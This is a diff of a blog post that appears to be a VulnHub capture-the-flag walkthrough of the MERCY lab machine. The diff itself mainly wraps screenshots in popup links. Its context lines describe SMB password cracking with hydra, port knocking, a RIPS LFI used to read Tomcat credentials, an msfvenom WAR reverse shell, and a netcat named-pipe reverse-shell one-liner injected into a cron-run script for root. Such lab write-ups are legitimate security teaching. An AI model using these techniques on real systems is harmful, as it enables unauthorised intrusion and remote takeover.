@@ -3,6 +3,7 @@ layout: post
 title: "digitalworld.local: MERCY Walkthrough"
 subtitle: "Blessed are the merciful, for they shall obtain mercy."
 date: 2018-11-25 17:53:38 +0000
+last_modified_at: 2018-11-25 17:59:34 +0000
 category: Walkthrough
 tags: [VulnHub, digitalworld.local]
 comments: true
@@ -59,17 +60,23 @@ PORT     STATE    SERVICE     REASON              VERSION
 
 Whoa! Samba is up. Haven't seen that in a while. Along with it, you can also see `22/tcp` and `80/tcp` filtered by the firewall. In any case, let's focus on the Apache Tomcat first since `nmap` finds the presence of a disallowed entry `/tryharder/tryharder` in `robots.txt`.
 
+<a class="image-popup">
 ![901bdbd2.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/901bdbd2.png)
+</a>
 
 Looks like `base64` to me. Let's decode it and see what it says.
 
+<a class="image-popup">
 ![7afb37cc.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/7afb37cc.png)
+</a>
 
 Duh?! Nothing useful at the moment.
 
 Now, let's switch our attention to the Tomcat installation.
 
+<a class="image-popup">
 ![5e58c8b0.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/5e58c8b0.png)
+</a>
 
 From my experience, entering the manager webapp requires authentication. I'm not even going to try that, having no information of the usernames and passwords whatsoever.
 
@@ -79,21 +86,29 @@ Tomcat is a shit-show. Time to go over to Samba.
 
 One can list down the services available in Samba with `smbclient` like so.
 
+<a class="image-popup">
 ![789d6f24.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/789d6f24.png)
+</a>
 
 What do we have here? A Samba share! Woohoo. Let's see if we can mount it without credentials.
 
+<a class="image-popup">
 ![0d0cd907.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/0d0cd907.png)
+</a>
 
 Oops! I recall `hydra` is able to crack SMB passwords online. Time to give it a shot.
 
 I'm assuming the username is `qiu`.
 
+<a class="image-popup">
 ![b7918310.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/b7918310.png)
+</a>
 
 That was fast!
 
+<a class="image-popup">
 ![c26b7415.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/c26b7415.png)
+</a>
 
 Not too bad, I must say.
 
@@ -101,7 +116,9 @@ Not too bad, I must say.
 
 The `.private` directory offers some important system information as follows.
 
+<a class="image-popup">
 ![93160038.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/93160038.png)
+</a>
 
 Well well well. Port-knocking. Let's write a port-knocking script, using `nmap` to do the deed.
 
@@ -123,23 +140,33 @@ done
 
 __Open HTTP__
 
+<a class="image-popup">
 ![4bd8b4f1.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/4bd8b4f1.png)
+</a>
 
 __Open SSH__
 
+<a class="image-popup">
 ![f25408df.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f25408df.png)
+</a>
 
 With two more open ports, let's get down to business.
 
+<a class="image-popup">
 ![f573f6ed.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f573f6ed.png)
+</a>
 
 I'm not amused&hellip; Moving on with the exploration, I find the presence of RIPS 0.53 as follows.
 
+<a class="image-popup">
 ![f8012b3d.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f8012b3d.png)
+</a>
 
 According to EDB-ID [18660](https://www.exploit-db.com/exploits/18660/), RIPS 0.53 is susceptible to multiple local file inclusion (LFI) vulnerabilities. Let's check it out.
 
+<a class="image-popup">
 ![b82d6fca.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/b82d6fca.png)
+</a>
 
 It's an LFI alright.
 
@@ -147,11 +174,15 @@ It's an LFI alright.
 
 We can expose the passwords in `tomcat-users.xml` by making use of the LFI vulnerability.
 
+<a class="image-popup">
 ![3f5186f0.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/3f5186f0.png)
+</a>
 
 Armed with the credentials, we can now log in to the manager webapp to deploy our evil webapp, a WAR file that allows a reverse shell callback.
 
+<a class="image-popup">
 ![133aa32a.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/133aa32a.png)
+</a>
 
 We can use `msfvenom` to generate such a WAR file like so.
 
@@ -161,15 +192,21 @@ We can use `msfvenom` to generate such a WAR file like so.
 
 By the way, we are dealing with a 32-bit Ubuntu.
 
+<a class="image-popup">
 ![37d41566.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/37d41566.png)
+</a>
 
 I've successfully deployed the webapp.
 
+<a class="image-popup">
 ![2c7236f3.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/2c7236f3.png)
+</a>
 
 On one hand, set up your `nc` listener. On the other hand, look for the JSP page to access in the WAR file like so.
 
+<a class="image-popup">
 ![607da0fe.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/607da0fe.png)
+</a>
 
 To access the malicious webapp, enter the following into your browser's address bar:
 
@@ -179,11 +216,15 @@ http://192.168.20.130/evil/tudvpurwgjh.jsp
 
 I humbly present a low-privilege shell.
 
+<a class="image-popup">
 ![74e9999e.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/74e9999e.png)
+</a>
 
 Before I forget, the proof of a low-privilege shell is at `/local.txt`.
 
+<a class="image-popup">
 ![40848530.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/40848530.png)
+</a>
 
 ### Privilege Escalation
 
@@ -199,11 +240,15 @@ $ echo "rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 192.168.20.128 5555
 
 Set up another `nc` listener at `5555/tcp`. Three minutes later, I have `root` shell.
 
+<a class="image-popup">
 ![7c7b76af.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/7c7b76af.png)
+</a>
 
 Before I forget, here's the proof that I'm `root`.
 
+<a class="image-popup">
 ![d818319a.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/d818319a.png)
+</a>
 
 :dancer:
 
